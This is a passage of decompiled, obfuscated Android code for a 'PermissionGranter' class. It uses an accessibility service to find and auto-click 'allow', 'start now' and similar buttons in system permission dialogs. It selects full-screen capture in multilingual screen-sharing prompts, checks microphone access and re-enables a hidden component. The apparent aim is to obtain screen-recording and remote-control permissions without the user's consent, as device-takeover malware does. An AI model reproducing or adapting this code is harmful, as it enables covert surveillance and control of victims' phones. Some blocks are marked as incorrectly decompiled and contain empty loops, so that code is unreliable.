                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
        } catch (Exception unused) {
        }
        if (AbstractC0779a1.m213652a5(lowerCase2, "xiaomi", false) || AbstractC0779a1.m213652a5(lowerCase2, "redmi", false)) {
            return true;
        }
        return AbstractC0779a1.m213652a5(lowerCase, "xiaomi", false);
    }

    /* renamed from: g0 */
    public static void m211297g0(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String lowerCase;
        String string;
        String string2;
        if (i > 6) {
            return;
        }
        String strM213671c4 = AbstractC0779a1.m213671c4(i, "  ");
        Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
        CharSequence className = accessibilityNodeInfo.getClassName();
        CharSequence text = accessibilityNodeInfo.getText();
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        boolean zIsClickable = accessibilityNodeInfo.isClickable();
        boolean zIsEnabled = accessibilityNodeInfo.isEnabled();
        boolean zIsVisibleToUser = accessibilityNodeInfo.isVisibleToUser();
        String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
        StringBuilder sbM40c1 = AbstractC0003a2.m40c1("✅ [权限] ", strM213671c4, "节点[", i, "]: 类名=");
        sbM40c1.append((Object) className);
        sbM40c1.append(", 文本='");
        sbM40c1.append((Object) text);
        sbM40c1.append("', 描述='");
        sbM40c1.append((Object) contentDescription);
        sbM40c1.append("', 可点击=");
        sbM40c1.append(zIsClickable);
        sbM40c1.append(", 启用=");
        sbM40c1.append(zIsEnabled);
        sbM40c1.append(", 可见=");
        sbM40c1.append(zIsVisibleToUser);
        sbM40c1.append(", ViewId=");
        sbM40c1.append(viewIdResourceName);
        sbM40c1.append(", 位置=");
        sbM40c1.append(rectM24a5);
        t60.m214714d6("PermissionGranter", sbM40c1.toString());
        CharSequence text2 = accessibilityNodeInfo.getText();
        if (text2 == null || (string2 = text2.toString()) == null) {
            lowerCase = "";
        } else {
            lowerCase = string2.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        }
        CharSequence className2 = accessibilityNodeInfo.getClassName();
        if (className2 == null || (string = className2.toString()) == null) {
            string = "";
        }
        String viewIdResourceName2 = accessibilityNodeInfo.getViewIdResourceName();
        String str = viewIdResourceName2 != null ? viewIdResourceName2 : "";
        if (accessibilityNodeInfo.isClickable() || AbstractC0779a1.m213652a5(string, "button", true)) {
            StringBuilder sbM41c2 = AbstractC0003a2.m41c2("⚠️ [权限] ", strM213671c4, "重要-可点击节点: 文本='", lowerCase, "', 类名='");
            sbM41c2.append(string);
            sbM41c2.append("', ViewId='");
            sbM41c2.append(str);
            sbM41c2.append("'");
            t60.m214726f4("PermissionGranter", sbM41c2.toString());
            boolean z = dh0.m212605a4(lowerCase) || AbstractC0779a1.m213652a5(str, "positive", false) || AbstractC0779a1.m213652a5(str, "button1", false) || AbstractC0779a1.m213652a5(str, "allow", false);
            boolean z2 = dh0.m212606a5(lowerCase) || AbstractC0779a1.m213652a5(lowerCase, "dismiss", true) || AbstractC0779a1.m213652a5(str, "negative", false) || AbstractC0779a1.m213652a5(str, "cancel", false);
            if (z) {
                StringBuilder sbM41c22 = AbstractC0003a2.m41c2("❌ [权限] ", strM213671c4, "确认按钮-发现确认按钮: 文本='", lowerCase, "', 类名='");
                sbM41c22.append(string);
                sbM41c22.append("'");
                t60.m214704c5("PermissionGranter", sbM41c22.toString());
            } else if (z2) {
                StringBuilder sbM41c23 = AbstractC0003a2.m41c2("❌ [权限] ", strM213671c4, "取消按钮-发现取消按钮: 文本='", lowerCase, "', 类名='");
                sbM41c23.append(string);
                sbM41c23.append("'");
                t60.m214704c5("PermissionGranter", sbM41c23.toString());
            }
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m211297g0(child, i + 1);
                child.recycle();
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:113:0x020c A[Catch: Exception -> 0x0043, TryCatch #0 {Exception -> 0x0043, blocks: (B:3:0x0005, B:7:0x0025, B:9:0x0033, B:11:0x0039, B:15:0x0047, B:17:0x004d, B:20:0x0054, B:24:0x005c, B:26:0x006a, B:28:0x0072, B:30:0x007a, B:32:0x0082, B:34:0x008a, B:36:0x0092, B:38:0x009a, B:40:0x00a2, B:45:0x00ae, B:47:0x00b4, B:49:0x00ba, B:51:0x00c2, B:53:0x00ca, B:59:0x00dc, B:62:0x0107, B:63:0x012e, B:64:0x0152, B:66:0x015a, B:69:0x0169, B:70:0x016e, B:72:0x0174, B:74:0x017a, B:76:0x0180, B:78:0x0186, B:80:0x019b, B:82:0x01a9, B:84:0x01af, B:86:0x01ba, B:88:0x01c0, B:91:0x01c7, B:93:0x01cd, B:95:0x01d5, B:97:0x01dd, B:99:0x01e5, B:103:0x01f0, B:106:0x01f8, B:108:0x01fe, B:111:0x0205, B:113:0x020c, B:115:0x021a, B:117:0x0220, B:119:0x022b, B:121:0x0231, B:124:0x0238, B:127:0x023f), top: B:132:0x0005 }] */
    /* JADX WARN: Removed duplicated region for block: B:80:0x019b A[Catch: Exception -> 0x0043, TryCatch #0 {Exception -> 0x0043, blocks: (B:3:0x0005, B:7:0x0025, B:9:0x0033, B:11:0x0039, B:15:0x0047, B:17:0x004d, B:20:0x0054, B:24:0x005c, B:26:0x006a, B:28:0x0072, B:30:0x007a, B:32:0x0082, B:34:0x008a, B:36:0x0092, B:38:0x009a, B:40:0x00a2, B:45:0x00ae, B:47:0x00b4, B:49:0x00ba, B:51:0x00c2, B:53:0x00ca, B:59:0x00dc, B:62:0x0107, B:63:0x012e, B:64:0x0152, B:66:0x015a, B:69:0x0169, B:70:0x016e, B:72:0x0174, B:74:0x017a, B:76:0x0180, B:78:0x0186, B:80:0x019b, B:82:0x01a9, B:84:0x01af, B:86:0x01ba, B:88:0x01c0, B:91:0x01c7, B:93:0x01cd, B:95:0x01d5, B:97:0x01dd, B:99:0x01e5, B:103:0x01f0, B:106:0x01f8, B:108:0x01fe, B:111:0x0205, B:113:0x020c, B:115:0x021a, B:117:0x0220, B:119:0x022b, B:121:0x0231, B:124:0x0238, B:127:0x023f), top: B:132:0x0005 }] */
    /* renamed from: g2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static boolean m211298g2(AccessibilityNodeInfo accessibilityNodeInfo) {
        int size;
        int i;
        String lowerCase;
        String string;
        int size2;
        int i2;
        String lowerCase2;
        String string2;
        String string3;
        String lowerCase3;
        String string4;
        String string5;
        boolean z = false;
        try {
            ArrayList arrayList = new ArrayList();
            m211268b5(0, accessibilityNodeInfo, arrayList);
            ArrayList arrayList2 = new ArrayList();
            ArrayList arrayList3 = new ArrayList();
            int size3 = arrayList.size();
            int i3 = 0;
            while (true) {
                String str = "";
                boolean z2 = true;
                if (i3 >= size3) {
                    break;
                }
                Object obj = arrayList.get(i3);
                i3++;
                AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj;
                CharSequence text = accessibilityNodeInfo2.getText();
                if (text == null || (string5 = text.toString()) == null) {
                    lowerCase3 = "";
                } else {
                    lowerCase3 = string5.toLowerCase(Locale.ROOT);
                    t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                }
                CharSequence className = accessibilityNodeInfo2.getClassName();
                if (className == null || (string4 = className.toString()) == null) {
                    string4 = "";
                }
                String viewIdResourceName = accessibilityNodeInfo2.getViewIdResourceName();
                if (viewIdResourceName != null) {
                    str = viewIdResourceName;
                }
                accessibilityNodeInfo2.getBoundsInScreen(new Rect());
                boolean z3 = (dh0.m212605a4(lowerCase3) || AbstractC0779a1.m213652a5(lowerCase3, "continue", true) || AbstractC0779a1.m213652a5(lowerCase3, "继续", z) || AbstractC0779a1.m213652a5(str, "positive", z) || AbstractC0779a1.m213652a5(str, "button1", z) || AbstractC0779a1.m213652a5(str, "allow", z) || AbstractC0779a1.m213652a5(str, "start", z) || AbstractC0779a1.m213652a5(str, "ok", z) || AbstractC0779a1.m213652a5(str, "grant", z)) ? true : z;
                if (!dh0.m212606a5(lowerCase3) && !AbstractC0779a1.m213652a5(lowerCase3, "dismiss", true) && !AbstractC0779a1.m213652a5(str, "negative", z) && !AbstractC0779a1.m213652a5(str, "cancel", z) && !AbstractC0779a1.m213652a5(str, "deny", z)) {
                    z2 = z;
                }
                if (z3) {
                    arrayList2.add(accessibilityNodeInfo2);
                    t60.m214704c5("PermissionGranter", "❌ [权限] 发现确认按钮: 文本='" + lowerCase3 + "', 类名='" + string4 + "', ViewId='" + str + "'");
                } else if (z2) {
                    arrayList3.add(accessibilityNodeInfo2);
                    t60.m214704c5("PermissionGranter", "❌ [权限] 发现取消按钮: 文本='" + lowerCase3 + "', 类名='" + string4 + "', ViewId='" + str + "'");
                } else {
                    t60.m214726f4("PermissionGranter", "⚠️ [权限] 未知按钮: 文本='" + lowerCase3 + "', 类名='" + string4 + "', ViewId='" + str + "'");
                }
                z = false;
            }
            if (arrayList2.isEmpty()) {
                if (arrayList2.isEmpty() && !arrayList.isEmpty()) {
                    if (arrayList3.size() == 1 && arrayList.size() == 1) {
                        t60.m214726f4("PermissionGranter", "⚠️ [权限] 只找到取消按钮，可能遗漏了确认按钮，启动深度搜索");
                        ArrayList arrayList4 = new ArrayList();
                        m211274c2(0, accessibilityNodeInfo, arrayList4);
                        size2 = arrayList4.size();
                        i2 = 0;
                        while (i2 < size2) {
                            Object obj2 = arrayList4.get(i2);
                            i2++;
                            AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) obj2;
                            CharSequence text2 = accessibilityNodeInfo3.getText();
                            if (text2 == null || (string3 = text2.toString()) == null) {
                                lowerCase2 = "";
                            } else {
                                lowerCase2 = string3.toLowerCase(Locale.ROOT);
                                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                            }
                            CharSequence className2 = accessibilityNodeInfo3.getClassName();
                            if (className2 == null || (string2 = className2.toString()) == null) {
                                string2 = "";
                            }
                            boolean z4 = dh0.m212605a4(lowerCase2) && !((!AbstractC0779a1.m213652a5(string2, "Button", true) && lowerCase2.length() > 20) || AbstractC0779a1.m213652a5(lowerCase2, "recording", true) || AbstractC0779a1.m213652a5(lowerCase2, "casting", true));
                            boolean zM212606a5 = dh0.m212606a5(lowerCase2);
                            if (z4 && !zM212606a5 && accessibilityNodeInfo3.isClickable() && accessibilityNodeInfo3.performAction(16)) {
                                break;
                            }
                        }
                    }
                    size = arrayList.size();
                    i = 0;
                    while (i < size) {
                        Object obj3 = arrayList.get(i);
                        i++;
                        AccessibilityNodeInfo accessibilityNodeInfo4 = (AccessibilityNodeInfo) obj3;
                        CharSequence text3 = accessibilityNodeInfo4.getText();
                        if (text3 == null || (string = text3.toString()) == null) {
                            lowerCase = "";
                        } else {
                            lowerCase = string.toLowerCase(Locale.ROOT);
                            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                        }
                        if (!dh0.m212606a5(lowerCase) && !AbstractC0779a1.m213652a5(lowerCase, "dismiss", true) && accessibilityNodeInfo4.performAction(16)) {
                        }
                    }
                }
                t60.m214726f4("PermissionGranter", "⚠️ [权限] 全面扫描完成，但未找到合适的按钮点击");
                return false;
            }
            if (!((AccessibilityNodeInfo) arrayList2.get(0)).performAction(16)) {
                t60.m214726f4("PermissionGranter", "⚠️ [权限] 点击确认按钮失败");
                if (arrayList2.isEmpty()) {
                    if (arrayList3.size() == 1) {
                        t60.m214726f4("PermissionGranter", "⚠️ [权限] 只找到取消按钮，可能遗漏了确认按钮，启动深度搜索");
                        ArrayList arrayList42 = new ArrayList();
                        m211274c2(0, accessibilityNodeInfo, arrayList42);
                        size2 = arrayList42.size();
                        i2 = 0;
                        while (i2 < size2) {
                        }
                    }
                    size = arrayList.size();
                    i = 0;
                    while (i < size) {
                    }
                }
                t60.m214726f4("PermissionGranter", "⚠️ [权限] 全面扫描完成，但未找到合适的按钮点击");
                return false;
            }
            return true;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 全面扫描按钮失败", e);
            return false;
        }
    }

    /* renamed from: g3 */
    public static boolean m211299g3(AccessibilityNodeInfo accessibilityNodeInfo, boolean z) {
        String lowerCase;
        String string;
        String string2;
        try {
            ArrayList arrayList = new ArrayList();
            m211269b6(accessibilityNodeInfo, arrayList, 0, z);
            ArrayList arrayList2 = new ArrayList();
            int size = arrayList.size();
            int i = 0;
            while (true) {
                boolean z2 = true;
                if (i >= size) {
                    break;
                }
                Object obj = arrayList.get(i);
                i++;
                AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj;
                CharSequence text = accessibilityNodeInfo2.getText();
                if (text == null || (string2 = text.toString()) == null) {
                    lowerCase = "";
                } else {
                    lowerCase = string2.toLowerCase();
                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase()");
                }
                CharSequence className = accessibilityNodeInfo2.getClassName();
                if (className == null || (string = className.toString()) == null) {
                    string = "";
                }
                String viewIdResourceName = accessibilityNodeInfo2.getViewIdResourceName();
                String str = viewIdResourceName != null ? viewIdResourceName : "";
                if (z && (AbstractC0779a1.m213652a5(lowerCase, "选择", false) || AbstractC0779a1.m213652a5(lowerCase, "单个", false) || AbstractC0779a1.m213652a5(lowerCase, "应用", false) || AbstractC0779a1.m213652a5(lowerCase, "屏幕", false) || AbstractC0779a1.m213652a5(lowerCase, "整个", false) || AbstractC0779a1.m213652a5(lowerCase, "全屏", false) || AbstractC0779a1.m213652a5(lowerCase, "select", false) || AbstractC0779a1.m213652a5(lowerCase, "single", false) || AbstractC0779a1.m213652a5(lowerCase, "app", false) || AbstractC0779a1.m213652a5(lowerCase, "screen", false) || AbstractC0779a1.m213652a5(lowerCase, "entire", false) || AbstractC0779a1.m213652a5(lowerCase, "full", false))) {
                    t60.m214726f4("PermissionGranter", "⚠️ [权限] Android 15保护-跳过包含选择文本的按钮: '" + lowerCase + "'");
                } else {
                    boolean z3 = dh0.m212605a4(lowerCase) || AbstractC0779a1.m213652a5(lowerCase, "start now", true) || AbstractC0779a1.m213652a5(lowerCase, "立即开始", false) || AbstractC0779a1.m213652a5(lowerCase, "现在开始", false) || AbstractC0779a1.m213652a5(lowerCase, "begin", true) || AbstractC0779a1.m213652a5(lowerCase, "continue", true) || AbstractC0779a1.m213652a5(lowerCase, "继续", false) || AbstractC0779a1.m213652a5(str, "positive", false) || AbstractC0779a1.m213652a5(str, "button1", false) || AbstractC0779a1.m213652a5(str, "allow", false) || AbstractC0779a1.m213652a5(str, "start", false) || AbstractC0779a1.m213652a5(str, "ok", false) || AbstractC0779a1.m213652a5(str, "grant", false);
                    if (!dh0.m212606a5(lowerCase) && !AbstractC0779a1.m213652a5(lowerCase, "dismiss", true) && !AbstractC0779a1.m213652a5(str, "negative", false) && !AbstractC0779a1.m213652a5(str, "cancel", false) && !AbstractC0779a1.m213652a5(str, "deny", false)) {
                        z2 = false;
                    }
                    if (z3 && !z2) {
                        arrayList2.add(accessibilityNodeInfo2);
                        t60.m214704c5("PermissionGranter", "❌ [权限] 安全模式发现确认按钮: 文本='" + lowerCase + "', 类名='" + string + "', ViewId='" + str + "'");
                    } else if (z2) {
                        t60.m214704c5("PermissionGranter", "❌ [权限] 安全模式发现取消按钮: 文本='" + lowerCase + "', 类名='" + string + "', ViewId='" + str + "'");
                    }
                }
            }
            if (arrayList2.isEmpty()) {
                t60.m214726f4("PermissionGranter", "⚠️ [权限] 安全模式未找到合适的确认按钮");
                return false;
            }
            if (((AccessibilityNodeInfo) arrayList2.get(0)).performAction(16)) {
                return true;
            }
            t60.m214726f4("PermissionGranter", "⚠️ [权限] 安全模式点击确认按钮失败");
            return false;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 安全模式全面扫描按钮失败", e);
            return false;
        }
    }

    /* renamed from: g4 */
    public static boolean m211300g4(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String string;
        if (accessibilityNodeInfo != null && i <= 5) {
            CharSequence text = accessibilityNodeInfo.getText();
            if (text == null || (string = text.toString()) == null) {
                string = "";
            }
            if (accessibilityNodeInfo.isClickable() && string.length() > 0) {
                Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
                boolean z = dh0.m212606a5(string) || dh0.m212605a4(string) || AbstractC0779a1.m213652a5(string, "recording", true) || AbstractC0779a1.m213652a5(string, "casting", true);
                int iWidth = rectM24a5.width();
                int iHeight = rectM24a5.height();
                if (z || iWidth <= 100 || iWidth >= 800 || iHeight <= 60 || iHeight >= 200 || string.length() <= 2 || string.length() >= 50 || AbstractC0779a1.m213652a5(string, "选择", false) || AbstractC0779a1.m213652a5(string, "Choose", false) || !accessibilityNodeInfo.performAction(16)) {
                }
                return true;
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                if (m211300g4(accessibilityNodeInfo.getChild(i2), i + 1)) {
                    return true;
                }
            }
        }
        return false;
    }

    /* renamed from: g5 */
    public static boolean m211301g5(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        try {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
            t60.m214694b5(listFindAccessibilityNodeInfosByText, "exactNodes");
            if (!listFindAccessibilityNodeInfosByText.isEmpty()) {
                return true;
            }
            String lowerCase = str.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            return m211302g6(accessibilityNodeInfo, lowerCase, 0);
        } catch (Exception unused) {
            t60.m214695b6("⚠️ [权限] 模糊搜索异常: " + str, "msg");
            return false;
        }
    }

    /* renamed from: g6 */
    public static boolean m211302g6(AccessibilityNodeInfo accessibilityNodeInfo, String str, int i) {
        String lowerCase;
        String string;
        String string2;
        if (i <= 8) {
            CharSequence text = accessibilityNodeInfo.getText();
            String lowerCase2 = "";
            if (text == null || (string2 = text.toString()) == null) {
                lowerCase = "";
            } else {
                lowerCase = string2.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription != null && (string = contentDescription.toString()) != null) {
                lowerCase2 = string.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            if (AbstractC0779a1.m213652a5(lowerCase, str, false) || AbstractC0779a1.m213652a5(lowerCase2, str, false)) {
                return true;
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null) {
                    if (m211302g6(child, str, i + 1)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        }
        return false;
    }

    /* renamed from: a5 */
    public final boolean m211303a5() {
        try {
            if (!dqtvuisjd.f52358m1.isServiceRunning()) {
                t60.m214704c5("PermissionGranter", "❌ [权限] 无障碍服务未运行");
                return false;
            }
            AccessibilityNodeInfo rootInActiveWindow = this.f52108a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                t60.m214726f4("PermissionGranter", "⚠️ [权限] 无法获取rootInActiveWindow，但服务正在运行");
                return true;
            }
            rootInActiveWindow.recycle();
            return true;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 检查无障碍服务状态失败", e);
            return false;
        }
    }

    /* renamed from: b2 */
    public final boolean m211304b2(String str) {
        AccessibilityNodeInfo rootInActiveWindow;
        try {
            if (t60.m214686a2(str, "com.android.systemui") && (rootInActiveWindow = this.f52108a0.getRootInActiveWindow()) != null) {
                boolean zM211265a9 = m211265a9(rootInActiveWindow);
                boolean zM211263a7 = m211263a7(rootInActiveWindow);
                boolean zM211264a8 = m211264a8(rootInActiveWindow);
                if (!zM211265a9 || (!zM211263a7 && !zM211264a8)) {
                    if (zM211263a7 && zM211264a8) {
                        return true;
                    }
                    if (zM211264a8 && !zM211265a9 && !zM211263a7) {
                        if (m211266b0(rootInActiveWindow)) {
                            return true;
                        }
                    }
                }
                return true;
            }
            return false;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 检查用户权限弹窗类型失败", e);
            return false;
        }
    }

    /* renamed from: b3 */
    public final boolean m211305b3() {
        try {
            return this.f52109a1.checkSelfPermission("android.permission.RECORD_AUDIO") == 0;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 检查麦克风权限失败", e);
            return false;
        }
    }

    /* renamed from: b4 */
    public final void m211306b4(AccessibilityNodeInfo accessibilityNodeInfo) {
        try {
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            float fCenterX = rect.centerX();
            float fCenterY = rect.centerY();
            GestureDescription.Builder builder = new GestureDescription.Builder();
            Path path = new Path();
            path.moveTo(fCenterX, fCenterY);
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, 100L));
            this.f52108a0.dispatchGesture(builder.build(), null, null);
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 点击按钮失败", e);
        }
    }

    /* renamed from: c1 */
    public final boolean m211307c1(AccessibilityNodeInfo accessibilityNodeInfo, String[] strArr, int i) {
        String string;
        String string2;
        if (i <= 8) {
            CharSequence text = accessibilityNodeInfo.getText();
            String str = "";
            if (text == null || (string = text.toString()) == null) {
                string = "";
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
                str = string2;
            }
            for (String str2 : strArr) {
                if ((AbstractC0779a1.m213652a5(string, str2, true) || AbstractC0779a1.m213652a5(str, str2, true)) && m211319f5(string, str)) {
                    if (!accessibilityNodeInfo.isClickable()) {
                        AccessibilityNodeInfo accessibilityNodeInfoM211283d5 = m211283d5(accessibilityNodeInfo);
                        if (accessibilityNodeInfoM211283d5 != null && accessibilityNodeInfoM211283d5.performAction(16)) {
                            return true;
                        }
                    } else if (accessibilityNodeInfo.performAction(16)) {
                        return true;
                    }
                }
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null) {
                    if (m211307c1(child, strArr, i + 1)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        }
        return false;
    }

    /* renamed from: c4 */
    public final void m211308c4() {
        dqtvuisjd dqtvuisjdVar = this.f52109a1;
        try {
            PackageManager packageManager = dqtvuisjdVar.getPackageManager();
            ComponentName componentName = new ComponentName(dqtvuisjdVar, (Class<?>) iuzxujjtqev.class);
            if (packageManager.getComponentEnabledSetting(componentName) == 2) {
                t60.m214726f4("PermissionGranter", "⚠️ [权限] iuzxujjtqev被禁用，正在启用...");
                packageManager.setComponentEnabledSetting(componentName, 1, 1);
            }
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 启用iuzxujjtqev失败", e);
        }
    }

    /* renamed from: d1 */
    public final boolean m211309d1(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        String string2;
        try {
            ArrayList arrayListM211284d6 = m211284d6(accessibilityNodeInfo, "android.widget.RadioButton");
            int size = arrayListM211284d6.size();
            int i = 0;
            while (i < size) {
                Object obj = arrayListM211284d6.get(i);
                i++;
                AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj;
                CharSequence text = accessibilityNodeInfo2.getText();
                String str = "";
                if (text == null || (string = text.toString()) == null) {
                    string = "";
                }
                CharSequence contentDescription = accessibilityNodeInfo2.getContentDescription();
                if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
                    str = string2;
                }
                if (AbstractC0779a1.m213652a5(string, "全屏", false) || AbstractC0779a1.m213652a5(string, "Full", false) || AbstractC0779a1.m213652a5(string, "Entire", false) || AbstractC0779a1.m213652a5(string, "整个", false) || AbstractC0779a1.m213652a5(string, "完整", false) || AbstractC0779a1.m213652a5(string, "屏幕录制", false) || AbstractC0779a1.m213652a5(str, "全屏", false) || AbstractC0779a1.m213652a5(str, "Full", false) || AbstractC0779a1.m213652a5(str, "Entire", false) || AbstractC0779a1.m213652a5(str, "Screen", false)) {
                    if (!accessibilityNodeInfo2.isChecked() && accessibilityNodeInfo2.isClickable() && accessibilityNodeInfo2.performAction(16)) {
                        m211330h3();
                        return true;
                    }
                }
            }
            return false;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 查找全屏RadioButton失败", e);
            return false;
        }
    }

    /* renamed from: d2 */
    public final boolean m211310d2(AccessibilityNodeInfo accessibilityNodeInfo) throws InterruptedException {
        String string;
        long j;
        String str;
        String string2;
        try {
            ArrayList arrayListM211284d6 = m211284d6(accessibilityNodeInfo, "android.widget.Spinner");
            int size = arrayListM211284d6.size();
            int i = 0;
            while (true) {
                long j2 = 500;
                if (i >= size) {
                    String[] strArr = {"android.widget.LinearLayout", "android.widget.RelativeLayout", "android.widget.FrameLayout", "android.view.ViewGroup", "android.widget.ListView", "androidx.appcompat.widget.AppCompatSpinner"};
                    for (int i2 = 0; i2 < 6; i2++) {
                        ArrayList arrayListM211284d62 = m211284d6(accessibilityNodeInfo, strArr[i2]);
                        int size2 = arrayListM211284d62.size();
                        int i3 = 0;
                        while (i3 < size2) {
                            Object obj = arrayListM211284d62.get(i3);
                            i3++;
                            AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj;
                            CharSequence text = accessibilityNodeInfo2.getText();
                            if (text == null || (string = text.toString()) == null) {
                                string = "";
                            }
                            CharSequence contentDescription = accessibilityNodeInfo2.getContentDescription();
                            if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                                j = j2;
                                str = "";
                            } else {
                                long j3 = j2;
                                str = string2;
                                j = j3;
                            }
                            if (accessibilityNodeInfo2.isClickable() && ((AbstractC0779a1.m213652a5(string, "选择", false) || AbstractC0779a1.m213652a5(string, "下拉", false) || AbstractC0779a1.m213652a5(string, "菜单", false) || AbstractC0779a1.m213652a5(string, "单个应用", false) || AbstractC0779a1.m213652a5(string, "整个屏幕", false) || AbstractC0779a1.m213652a5(string, "共享一个应用", false) || AbstractC0779a1.m213652a5(string, "共享整个屏幕", false) || AbstractC0779a1.m213652a5(str, "下拉", false) || AbstractC0779a1.m213652a5(str, "选择", false) || AbstractC0779a1.m213652a5(str, "菜单", false) || accessibilityNodeInfo2.getChildCount() > 0) && accessibilityNodeInfo2.performAction(16))) {
                                Thread.sleep(600L);
                                if (m211324g7()) {
                                    m211330h3();
                                    return true;
                                }
                            }
                            j2 = j;
                        }
                    }
                    long j4 = j2;
                    String[] strArr2 = {"共享一个应用", "共享整个屏幕", "单个应用", "整个屏幕", "全屏", "选择应用", "选择屏幕", "应用", "屏幕", "Single app", "Entire screen", "Full screen", "Select app", "Select screen", "App", "Screen", "Single app", "Entire screen", "Full screen", "Choose app", "App", "Screen", "アプリ", "画面", "全画面", "앱", "화면", "전체 화면", "Aplicación", "Pantalla", "Application", "Écran", "App", "Bildschirm"};
                    for (int i4 = 0; i4 < 34; i4++) {
                        ArrayList arrayListM211286d8 = m211286d8(accessibilityNodeInfo, strArr2[i4]);
                        int size3 = arrayListM211286d8.size();
                        int i5 = 0;
                        while (i5 < size3) {
                            Object obj2 = arrayListM211286d8.get(i5);
                            i5++;
                            AccessibilityNodeInfo parent = ((AccessibilityNodeInfo) obj2).getParent();
                            while (true) {
                                if (parent == null || parent.getParent() == null) {
                                    break;
                                }
                                if (parent.isClickable() && parent.performAction(16)) {
                                    Thread.sleep(j4);
                                    if (m211324g7()) {
                                        m211330h3();
                                        return true;
                                    }
                                } else {
                                    parent = parent.getParent();
                                }
                            }
                        }
                    }
                    return false;
                }
                Object obj3 = arrayListM211284d6.get(i);
                i++;
                AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) obj3;
                if (accessibilityNodeInfo3.isClickable() && accessibilityNodeInfo3.performAction(16)) {
                    Thread.sleep(500L);
                    if (m211324g7()) {
                        m211330h3();
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 查找全屏Spinner失败", e);
            return false;
        }
    }

    /* renamed from: d3 */
    public final boolean m211311d3(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        String string2;
        int i = R$string.app_name;
        dqtvuisjd dqtvuisjdVar = this.f52109a1;
        String string3 = dqtvuisjdVar.getString(i);
        t60.m214694b5(string3, "context.getString(R.string.app_name)");
        String[] strArr = {string3, dqtvuisjdVar.getPackageName(), "リモートコントロール", "원격 제어", "Control Remoto"};
        for (int i2 = 0; i2 < 5; i2++) {
            String str = strArr[i2];
            t60.m214694b5(str, "keyword");
            try {
                for (AccessibilityNodeInfo accessibilityNodeInfo2 : accessibilityNodeInfo.findAccessibilityNodeInfosByText(str)) {
                    CharSequence text = accessibilityNodeInfo2.getText();
                    String str2 = "";
                    if (text == null || (string = text.toString()) == null) {
                        string = "";
                    }
                    CharSequence contentDescription = accessibilityNodeInfo2.getContentDescription();
                    if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
                        str2 = string2;
                    }
                    if (m211319f5(string, str2)) {
                        if (!accessibilityNodeInfo2.isClickable()) {
                            AccessibilityNodeInfo accessibilityNodeInfoM211283d5 = m211283d5(accessibilityNodeInfo2);
